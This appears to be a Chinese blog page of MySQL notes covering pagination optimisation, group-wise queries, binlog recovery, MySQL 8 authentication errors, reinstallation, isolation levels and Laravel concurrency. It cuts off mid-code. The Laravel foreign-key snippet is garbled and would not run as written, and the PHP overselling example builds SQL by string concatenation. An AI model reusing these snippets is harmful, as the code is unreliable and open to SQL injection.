<h3 id="limit-语句的索引使用优化"><a href="#limit-语句的索引使用优化" class="headerlink" title="limit 语句的索引使用优化"></a>limit 语句的索引使用优化</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">针对于 limit 语句的优化，我们可以在它前面加 order by 索引字段</span><br><span class="line"></span><br><span class="line">如果 order by 的字段是索引，会先去索引文件中查找指定行数的数据</span><br><span class="line">mysql&gt; explain select sql_no_cache  * <span class="keyword">from</span> article order by id  limit <span class="number">90000</span>,<span class="number">10</span> \G;</span><br><span class="line">索引覆盖 + 延时关联</span><br><span class="line"></span><br><span class="line">原理：主要利用索引覆盖查询，把覆盖索引查询返回的 id 作为与我们要查询记录的 id 进行相关联，</span><br><span class="line"></span><br><span class="line">mysql&gt; select sql_no_cache  * <span class="keyword">from</span> article limit <span class="number">1000000</span>,<span class="number">10</span>;</span><br><span class="line">mysql&gt; select t1.* <span class="keyword">from</span> article <span class="keyword">as</span> t1 inner join (select id <span class="keyword">as</span> pid <span class="keyword">from</span> article  limit <span class="number">10000</span>,<span class="number">10</span>) <span class="keyword">as</span> t2 on t1.id=t2.pid;</span><br><span class="line">https:<span class="comment">//learnku.com/articles/28609#replies</span></span><br></pre></td></tr></table></figure>
<h3 id="group-by-城市行业后获取工资最低"><a href="#group-by-城市行业后获取工资最低" class="headerlink" title="group by 城市行业后获取工资最低"></a>group by 城市行业后获取工资最低</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">MySQL 求助， group by 城市行业后获取工资最低的一条数据https:<span class="comment">//cn.v2ex.com/t/600001#reply34</span></span><br><span class="line">select business.id, business.money <span class="keyword">from</span> business join (select city, min(money) <span class="keyword">as</span> min_money <span class="keyword">from</span> business group by city) <span class="keyword">as</span> temp on business.city = temp.city and business.money = temp.min_money;</span><br><span class="line"></span><br><span class="line">select * <span class="keyword">from</span> (select * <span class="keyword">from</span> T order by money limit <span class="number">100</span>) tmp group by city, business;</span><br></pre></td></tr></table></figure>
<h3 id="每个司机今天最早的一笔订单"><a href="#每个司机今天最早的一笔订单" class="headerlink" title="每个司机今天最早的一笔订单"></a>每个司机今天最早的一笔订单</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//mp.weixin.qq.com/s?__biz=MzI1MzY0MzE4Mg==&amp;mid=2247483773&amp;idx=1&amp;sn=d2578386819d66147f09209ecc834436&amp;chksm=e9d011bcdea798aa21d65f935567eb1c66511d2fc9925b51ccea6a4985a21d85d95c01a513b3&amp;scene=21#wechat_redirect</span></span><br><span class="line"></span><br><span class="line">select name,sex,register,ordertime <span class="keyword">from</span> userinfo,orderinfo where userinfo.id = orderinfo.userid group by orderinfo.userid order by orderinfo.ordertime limit <span class="number">1</span></span><br><span class="line">select name,sex,register,min(ordertime) <span class="keyword">from</span> userinfo,orderinfo where userinfo.id = orderinfo.userid group by orderinfo.userid</span><br><span class="line">张三的第一个用户应该是二号，细心的你可能已经发现问题了，还是group by的问题，它返回的是链接之后分组的第一条记录，min(ordertime)相当于是不在表中的一个新加入的字段，它的值通过min函数计算而来，所以会出现上面的结果</span><br><span class="line"></span><br><span class="line">select name,sex,register,ordertime,orderuser <span class="keyword">from</span> userinfo left outer join orderinfo on userinfo.id = orderinfo.userid where orderinfo.ordertime <span class="keyword">in</span> (select min(ordertime) <span class="keyword">from</span> orderinfo group by userid)</span><br><span class="line">where子句限定了ordertime的取值范围，所以不会出现那些没有订单信息的用户，所以我们还要对语句作如下修改，让ordertime可以为Null值：</span><br><span class="line">select name,sex,register,ordertime,orderuser <span class="keyword">from</span> userinfo left outer join orderinfo on userinfo.id = orderinfo.userid where orderinfo.ordertime <span class="keyword">in</span> (select min(ordertime) <span class="keyword">from</span> orderinfo group by userid) or orderinfo.ordertime is Null</span><br><span class="line"></span><br><span class="line">select name,sex,register,ordertime,orderuser <span class="keyword">from</span> userinfo,orderinfo,(select userid,min(ordertime) <span class="keyword">as</span> ordertime2 <span class="keyword">from</span> orderinfo group by userid) <span class="keyword">as</span> orderinfo2 where userinfo.id = orderinfo.userid and orderinfo.ordertime = orderinfo2.ordertime2 and orderinfo.userid = orderinfo2.userid</span><br><span class="line"></span><br><span class="line">mysql没有row_number()/rank()/dense_rank() over(partition by)这样高级的sql语法，不过我们可以通过编程的方式来模拟实现类似的功能</span><br><span class="line">select u.name,u.sex,u.register,o.ordertime,o.orderuser <span class="keyword">from</span> userinfo <span class="keyword">as</span> u,(select orderinfo.*,<span class="keyword">if</span>(@userid = orderinfo.userid,@rank:=@rank+<span class="number">1</span>,@rank:=<span class="number">1</span>) <span class="keyword">as</span> rank,@userid:=orderinfo.userid <span class="keyword">from</span> orderinfo,(select @rank:=<span class="number">0</span>,@userid:=NULL) <span class="keyword">as</span> b order by orderinfo.userid,orderinfo.ordertime) <span class="keyword">as</span> o where u.id = o.userid and o.rank = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">mysql中变量不用事前申明，在用的时候直接用“@变量名”使用就可以了。</span><br><span class="line">第一种用法：set @num=<span class="number">1</span>; 或set @num:=<span class="number">1</span>; <span class="comment">//这里要使用变量来保存数据，直接使用@num变量</span></span><br><span class="line">第二种用法：select @num:=<span class="number">1</span>; 或 select @num:=字段名 <span class="keyword">from</span> 表名 where ……</span><br><span class="line">注意上面两种赋值符号，使用set时可以用“=”或“：=”，但是使用select时必须用“：=赋值”</span><br><span class="line"></span><br><span class="line">使用变量添加行号</span><br><span class="line"></span><br><span class="line">我们可以设置一个初始行号，接下来在 select语句中不断改变行号的值即可：</span><br><span class="line"></span><br><span class="line">set @i = <span class="number">0</span>;</span><br><span class="line">select   (@i:=@i+<span class="number">1</span>)  <span class="keyword">as</span>   i,userinfo.*   <span class="keyword">from</span>   userinfo</span><br><span class="line">如果使用一句话，我们可以将设置初始值的过程放在<span class="keyword">from</span>后面：</span><br><span class="line"></span><br><span class="line">select   (@i:=@i+<span class="number">1</span>)  <span class="keyword">as</span>   i,userinfo.*   <span class="keyword">from</span>   userinfo,(select   @i:=<span class="number">0</span>)   <span class="keyword">as</span>  it </span><br><span class="line"></span><br><span class="line">我们根据司机的注册时间划分司机类型：</span><br><span class="line"></span><br><span class="line">select name,<span class="keyword">if</span>(register &gt; <span class="string">'2017-08-05'</span>,<span class="string">'A'</span>,<span class="string">'B'</span>) <span class="keyword">as</span> type <span class="keyword">from</span> userinfo</span><br><span class="line">select orderinfo.*,<span class="keyword">if</span>(@userid = orderinfo.userid,@rank:=@rank+<span class="number">1</span>,@rank:=<span class="number">1</span>) <span class="keyword">as</span> rank,@userid:=orderinfo.userid <span class="keyword">from</span> orderinfo,(select @rank:=<span class="number">0</span>,@userid:=NULL) <span class="keyword">as</span> b</span><br></pre></td></tr></table></figure>
<h3 id="删除重复"><a href="#删除重复" class="headerlink" title="删除重复"></a>删除重复</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">select *<span class="keyword">from</span> hso_minline where phymin <span class="keyword">in</span>(select phymin <span class="keyword">from</span> hso_minline where symbol=<span class="string">'xau'</span> and uts&gt;<span class="number">1565971200</span> group by phymin having count(*) &gt;<span class="number">1</span>) and  symbol=<span class="string">'xau'</span> and uts&gt;<span class="number">1565971200</span> limit <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> hso_minline WHERE id not IN (SELECT bid FROM (SELECT min(id) <span class="keyword">as</span> bid FROM hso_minline where symbol=<span class="string">'xau'</span> and uts&gt;<span class="number">1565971200</span>  GROUP BY phymin)<span class="keyword">as</span> b) and symbol=<span class="string">'xau'</span> and uts&gt;<span class="number">1565971200</span>;</span><br></pre></td></tr></table></figure>
<h3 id="MySQL-通过-binlog-恢复数据"><a href="#MySQL-通过-binlog-恢复数据" class="headerlink" title="MySQL 通过 binlog 恢复数据"></a>MySQL 通过 binlog 恢复数据</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">如果不知道 mysql 的配置文件路径，可以使用 mysql 命令进行查找，</span><br><span class="line"></span><br><span class="line">mysql --verbose --help|grep -A <span class="number">1</span> <span class="string">'Default options’ #该命令会罗列出my.cnf顺序查找的路径。</span></span><br><span class="line"><span class="string">Default options are read from the following files in the given order:</span></span><br><span class="line"><span class="string">/etc/my.cnf /etc/mysql/my.cnf /usr/etc/my.cnf ~/.my.cnf</span></span><br><span class="line"><span class="string">binlog 就是 binary log，二进制日志文件，记录所有数据库更新语句，包括表更新和记录更新，即数据操纵语言 (DML)，binlog 主要用于数据恢复和配置主从复制等；</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">数据恢复：当数据库误删或者发生不可描述的事情时，可以通过 binlog 恢复到某个时间点的数据。</span></span><br><span class="line"><span class="string">主从复制：当有数据库更新之后，主库通过 binlog 记录并通知从库进行更新，从而保证主从数据库数据一致；</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">log_bin=ON</span></span><br><span class="line"><span class="string">log_bin_basename=/path/bin-log</span></span><br><span class="line"><span class="string">log_bin_index=/path/bin-log.index</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">statement 格式日志，执行 mysqlbinlog /path/bin-log.000001，可以直接看到原始执行的 SQL 语句</span></span><br><span class="line"><span class="string">row 格式日志，则可读性没有那么好，但仍可通过参数使文档更加可读 mysqlbinlog -v /path/bin-log.000001</span></span><br><span class="line"><span class="string">mysqlbinlog 两对非常重要的参数</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">--start-datetime --stop-datetime 解析某一个时间段内的 binlog；</span></span><br><span class="line"><span class="string">--start-position --stop-position 解析在两个 position 之间的 binlog；</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">CREATE TABLE `users` (</span></span><br><span class="line"><span class="string">          `id` int(11) unsigned NOT NULL AUTO_INCREMENT,</span></span><br><span class="line"><span class="string">          `name` varchar(255) DEFAULT NULL,</span></span><br><span class="line"><span class="string">          `age` int(8) DEFAULT NULL,</span></span><br><span class="line"><span class="string">          PRIMARY KEY (`id`)</span></span><br><span class="line"><span class="string"> ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;</span></span><br><span class="line"><span class="string"> INSERT INTO `users` (`id`, `name`, `age`)</span></span><br><span class="line"><span class="string">    VALUES</span></span><br><span class="line"><span class="string">        (null, '</span>姓名一<span class="string">', 5);</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"> mysqldump -uroot -p T &gt; /path/xxx.sql;   # 备份数据库</span></span><br><span class="line"><span class="string"> show master status;   # 查看当前的position位置，此时值为154</span></span><br><span class="line"><span class="string">INSERT INTO `users` (`id`, `name`, `age`)</span></span><br><span class="line"><span class="string">VALUES</span></span><br><span class="line"><span class="string"> (null, '</span>姓名二<span class="string">', 13),</span></span><br><span class="line"><span class="string"> (null, '</span>姓名三<span class="string">', 14),</span></span><br><span class="line"><span class="string"> (null, '</span>姓名四<span class="string">', 15),</span></span><br><span class="line"><span class="string"> (null, '</span>姓名五<span class="string">', 16),</span></span><br><span class="line"><span class="string"> (null, '</span>姓名六<span class="string">', 17);</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"> update users set age = 5；</span></span><br><span class="line"><span class="string"> INSERT INTO `users` (`id`, `name`, `age`)</span></span><br><span class="line"><span class="string"> VALUES</span></span><br><span class="line"><span class="string"> (null, '</span>姓名七<span class="string">', 16),</span></span><br><span class="line"><span class="string"> (null, '</span>姓名八<span class="string">', 18);</span></span><br><span class="line"><span class="string"> mysqlbinlog --start-position=154  --stop-position=513  bin-log.000001 &gt; /path/bak.sql;</span></span><br><span class="line"><span class="string"> mysql -uroot -p &lt; /path/bak.sql;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"> https://learnku.com/articles/20628</span></span><br></pre></td></tr></table></figure>
<h3 id="MySQL-8-0-加密方式不兼容"><a href="#MySQL-8-0-加密方式不兼容" class="headerlink" title="MySQL 8.0 加密方式不兼容"></a>MySQL 8.0 加密方式不兼容</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Illuminate\Database\QueryException  : SQLSTATE[HY000] [<span class="number">2054</span>] The server requested authentication method unknown to the client (SQL: select * <span class="keyword">from</span> information_schema.tables where table_schema = weibo and table_name = migrations and table_type = <span class="string">'BASE TABLE'</span>)</span><br><span class="line">运行 php artisan migrate -v 查看更详细信息如下：</span><br><span class="line"></span><br><span class="line"> Exception trace:</span><br><span class="line"></span><br><span class="line">  <span class="number">1</span>   PDOException::(<span class="string">"PDO::__construct(): The server requested authentication method unknown to the client [caching_sha2_password]"</span>)</span><br><span class="line">      /www/weibo/vendor/laravel/framework/src/Illuminate/Database/Connectors/Connector.php:<span class="number">70</span></span><br><span class="line">      MySQL <span class="number">8.0</span> 使用了新的密码加密方式：caching_sha2_password，而许多客户端还不支持这种方式，比如 php 的 PDO 扩展。</span><br><span class="line">      </span><br><span class="line">     修改 docker-compose.yml 的 mysql 服务部分，添加一行：</span><br><span class="line">     </span><br><span class="line">      command: --<span class="keyword">default</span>-authentication-plugin=mysql_native_password</span><br><span class="line">     my.cnf 配置文件中 [mysqld] 下添加一行：</span><br><span class="line">     <span class="keyword">default</span>-authentication-plugin=mysql_native_password</span><br><span class="line">     重新构建服务，依次执行：docker-compose down, docker-compose up -d</span><br><span class="line">     运行 docker container exec -it &lt;container_name or id&gt; <span class="regexp">/bin/</span>bash 进入 mysql 所在的容器。登录 root 账号：mysql -u root -p &lt;password&gt;，登入 mysql 后依次运行：</span><br><span class="line">     ALTER USER <span class="string">'root'</span>@<span class="string">'localhost'</span> IDENTIFIED WITH mysql_native_password BY <span class="string">'your_password'</span>;</span><br><span class="line">     FLUSH PRIVILEGES; </span><br><span class="line">https:<span class="comment">//learnku.com/articles/34823</span></span><br></pre></td></tr></table></figure>
<h3 id="MySQL-安装常见错误"><a href="#MySQL-安装常见错误" class="headerlink" title="MySQL 安装常见错误"></a>MySQL 安装常见错误</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">rpm -Uvh mysql57-community-release-el7<span class="number">-10.</span>noarch.rpm</span><br><span class="line">#命令行出现 mysql57-community-release-el7-8.noarch</span><br><span class="line">rpm -e --nodeps mysql57-community-release-el7<span class="number">-8.</span>noarch</span><br><span class="line"><span class="number">2.</span> 依赖报错</span><br><span class="line"></span><br><span class="line"><span class="built_in">Error</span>: Package: mysql-community-server<span class="number">-5.7</span><span class="number">.20</span><span class="number">-1.</span>el7.x86_64 (mysql57-community)</span><br><span class="line">           Requires: libsasl2.so<span class="number">.3</span>()(<span class="number">64</span>bit)</span><br><span class="line"><span class="built_in">Error</span>: Package: mysql-community-client<span class="number">-5.7</span><span class="number">.20</span><span class="number">-1.</span>el7.x86_64 (mysql57-community)</span><br><span class="line">           Requires: libstdc++.so<span class="number">.6</span>(GLIBCXX_3<span class="number">.4</span><span class="number">.15</span>)(<span class="number">64</span>bit)</span><br><span class="line"><span class="built_in">Error</span>: Package: mysql-community-libs<span class="number">-5.7</span><span class="number">.20</span><span class="number">-1.</span>el7.x86_64 (mysql57-community)</span><br><span class="line">...</span><br><span class="line">分析</span><br><span class="line"></span><br><span class="line">因为 旧版本 mysql 的依赖问题；最快的解决方案就是卸载重装</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span> 卸载</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> 快速删除</span><br><span class="line"></span><br><span class="line">yum remove  mysql mysql-server mysql-libs mysql-server</span><br><span class="line"><span class="number">2.</span> 查找残留文件</span><br><span class="line"></span><br><span class="line">rpm -qa | grep -i mysql</span><br><span class="line">## 将查询出来的文件删除</span><br><span class="line">yum remove mysql-community-common<span class="number">-5.7</span><span class="number">.20</span><span class="number">-1.</span>el6.x86_64</span><br><span class="line">## 删除残余目录</span><br><span class="line">whereis mysql</span><br><span class="line">rm –rf /usr/lib64/mysql</span><br><span class="line"><span class="number">3.</span> 删除依赖</span><br><span class="line"></span><br><span class="line">## 查找依赖 </span><br><span class="line">yum list installed | grep mysql</span><br><span class="line">## 删除找到的依赖</span><br><span class="line">yum -y remove mysql-libs.x86_64</span><br><span class="line"><span class="number">4.</span> 安装新 mysql</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> 添加镜像源，从官网 downloads 选取</span><br><span class="line"></span><br><span class="line">wget dev.mysql.com/get/mysql-community-release-el6<span class="number">-5.</span>noarch.rpm</span><br><span class="line">yum localinstall mysql-community-release-el6<span class="number">-5.</span>noarch.rpm</span><br><span class="line">yum repolist all | grep mysql</span><br><span class="line">yum-config-manager --disable mysql55-community</span><br><span class="line">yum-config-manager --disable mysql56-community</span><br><span class="line">yum-config-manager --enable mysql57-community-dmr</span><br><span class="line">yum repolist enabled | grep mysql</span><br><span class="line"><span class="number">2.</span> 安装</span><br><span class="line"></span><br><span class="line">yum install mysql-community-server</span><br><span class="line">https:<span class="comment">//learnku.com/articles/35042</span></span><br></pre></td></tr></table></figure>
<h3 id="数据库脏读"><a href="#数据库脏读" class="headerlink" title="数据库脏读"></a>数据库脏读</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">MYSQL查看数据库事务隔离级别</span><br><span class="line"></span><br><span class="line"><span class="number">1</span></span><br><span class="line">show variables like <span class="string">'%isolation%'</span>;</span><br><span class="line">修改MYSQL数据库事务隔离级别</span><br><span class="line"></span><br><span class="line">设置innodb的事务级别方法是：set 作用域 transaction isolation level 事务隔离级别，例如：</span><br><span class="line">SET [SESSION | GLOBAL] TRANSACTION ISOLATION LEVEL &#123;READ UNCOMMITTED | READ COMMITTED | REPEATABLE READ | SERIALIZABLE&#125;</span><br><span class="line"> </span><br><span class="line">mysql&gt; set global transaction isolation level read committed; #全局的</span><br><span class="line"></span><br><span class="line">mysql&gt; set session transaction isolation level read committed; #当前会话</span><br><span class="line">http:<span class="comment">//blog.qicunshang.com/2018/02/07/database-dirty-read/</span></span><br></pre></td></tr></table></figure>
<h3 id="创建外键报错"><a href="#创建外键报错" class="headerlink" title="创建外键报错"></a>创建外键报错</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">外键关联的数据结构不对，查看了表的数据结构发现 ID 主键自增是 int unsigned 类型的，而我关联的 parent_id 是 int 类型的，所以数据结构不一致才会报错</span><br><span class="line">Schema:：create（<span class="string">"store_menus'，function（Blueprint $table）&#123;</span></span><br><span class="line"><span class="string">$table-&gt;increments（'id）：</span></span><br><span class="line"><span class="string">$table-&gt;string（'title'）-&gt;upinue（）-&gt;comment（菜单名称）；</span></span><br><span class="line"><span class="string">$table-&gt;integer（'parent_id'）-&gt;index（）-&gt;default（0）-&gt;comment“父类ID’）；</span></span><br><span class="line"><span class="string">https://learnku.com/articles/35353</span></span><br></pre></td></tr></table></figure>
<h3 id="并发测试"><a href="#并发测试" class="headerlink" title="并发测试"></a>并发测试</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">    DB::table(<span class="string">'articles'</span>)-&gt;where(<span class="string">'id'</span> , $request-&gt;id)-&gt;increment(<span class="string">'like'</span>);</span><br><span class="line"><span class="number">100</span>并发结果为<span class="number">100</span></span><br><span class="line">  <span class="keyword">return</span> DB::transaction(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">use</span> (<span class="params">$request</span>)</span>&#123;</span><br><span class="line">       $article = Article::find($request-&gt;id);</span><br><span class="line">       $article-&gt;like += <span class="number">1</span>;</span><br><span class="line">       $article-&gt;save();</span><br><span class="line">       <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;message(<span class="string">'点赞成功！'</span>);</span><br><span class="line">    &#125;);</span><br><span class="line"><span class="number">100</span>并发结果为<span class="number">177</span></span><br><span class="line">.increment 方法编译后的结果就是 update like = like +<span class="number">1</span> where id = <span class="string">'id'</span>,update 语句是行级锁，所有是顺序执行更新的。</span><br><span class="line"><span class="number">2.</span> 在事务里面进行查询之后再更新，MySQL 默认使用 RR 级别隔离，所有可能存在并发请求的时候读取的值是同一个，</span><br><span class="line">这里避免的方式是加上 Article::lockForUpdate ()-&gt;find ($request-&gt;id); 排它锁，目的是在本次事物执行查询的时候，其他事务是不允许读取的，这样才能防止并发下产生的问题。https:<span class="comment">//learnku.com/articles/35337</span></span><br><span class="line">单个请求是可以实现的 只有在多数并发访问的时候才会出现异常</span><br></pre></td></tr></table></figure>
<h3 id="mysql-update超卖"><a href="#mysql-update超卖" class="headerlink" title="mysql update超卖"></a>mysql update超卖</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">以抢购 <span class="number">100</span> 件商品为例，商品表 num=<span class="number">100</span></span><br><span class="line">在函数 doPageGoodsOrder 中，如果使用如下 sql</span><br><span class="line"></span><br><span class="line">$sql=<span class="string">"update ims_hotmallstore_goods set num=$number where num&gt;0 and id="</span>.$goods[<span class="string">'id'</span>];</span><br><span class="line"></span><br><span class="line">即直接更新数据，不在 sql 中运算，在使用 apache ab 测试时</span><br><span class="line"></span><br><span class="line">ab -n <span class="number">1000</span> -c <span class="number">100</span> http:<span class="comment">//redis.test/demo/test.php?i=2</span></span><br><span class="line"></span><br><span class="line">发现：</span><br><span class="line"></span><br><span class="line">商品表，num 字段不为 <span class="number">0</span></span><br><span class="line">订单表，生成 <span class="number">456</span> 份订单</span><br><span class="line">日志表，<span class="number">1000</span> 条日志，其中抢购成功的即 status=<span class="number">1</span> 的是 <span class="number">100</span> 条</span><br><span class="line">如果在 sql 中计算，即：</span><br><span class="line"></span><br><span class="line">$sql=<span class="string">"update ims_hotmallstore_goods set num=num-"</span>.$goods_number.<span class="string">" where num&gt;0 and id="</span>.$goods[<span class="string">'id'</span>];</span><br><span class="line"></span><br><span class="line">结果正常，num=<span class="number">0</span>，订单 <span class="number">100</span> 条，日志 <span class="number">1000</span> 条</span><br><span class="line">并发高的情况下，必须要用 mysql 的更新锁。</span><br><span class="line">问题出在上面判断库存的时候：</span><br><span class="line"></span><br><span class="line">假设 A 取到的是剩余 <span class="number">100</span> 库存，并发时 B 取到的也是 <span class="number">100</span> 库存</span><br><span class="line">当 A 自行减法算出库存为 <span class="number">99</span> 并更新，这时 C 拿到的库存可能是 <span class="number">100</span>，也可能是 <span class="number">99</span></span><br><span class="line">当 C 自行减一后，算出 <span class="number">98</span> 时，这时候可能 B 算出来是 <span class="number">99</span> 并更新到库存</span><br><span class="line">当 D 获得库存时，可能是 <span class="number">99</span> 还可能是 <span class="number">100</span></span><br><span class="line">以上就会出现这种情况。</span><br><span class="line">解决方案：</span><br><span class="line">使用 mysql 事务处理，在获取库存之前开始处理事务并锁定表，然后结束事务，laravel 文档中有这一条代码</span><br><span class="line"></span><br><span class="line">DB::table(<span class="string">'users'</span>)-&gt;where(<span class="string">'votes'</span>, <span class="string">'&gt;'</span>, <span class="number">100</span>)-&gt;lockForUpdate()-&gt;get();</span><br><span class="line"><span class="comment">// 抢购下单</span></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">doPageGoodsStore</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        $pdo = self::Pdo();</span><br><span class="line">        $goods_id=<span class="number">1</span>;</span><br><span class="line">        <span class="comment">/**诺，问题所在</span></span><br><span class="line"><span class="comment">            对于 redis 来说，它属于单线程的原子性操作，但是 mysql 不是。</span></span><br><span class="line"><span class="comment">            所以这里拿商品数据，你是通过查询数据库获取的。</span></span><br><span class="line"><span class="comment">            而又因为你算库存的时候，通过查询数据库获取到的库存来计算，</span></span><br><span class="line"><span class="comment">            在并发情况下自然会引起不正确，这里的库存数，建议也通过 redis 中存储的热数据来计算</span></span><br><span class="line"><span class="comment">            比如 $stock = $redis-&gt;llen('num');</span></span><br><span class="line"><span 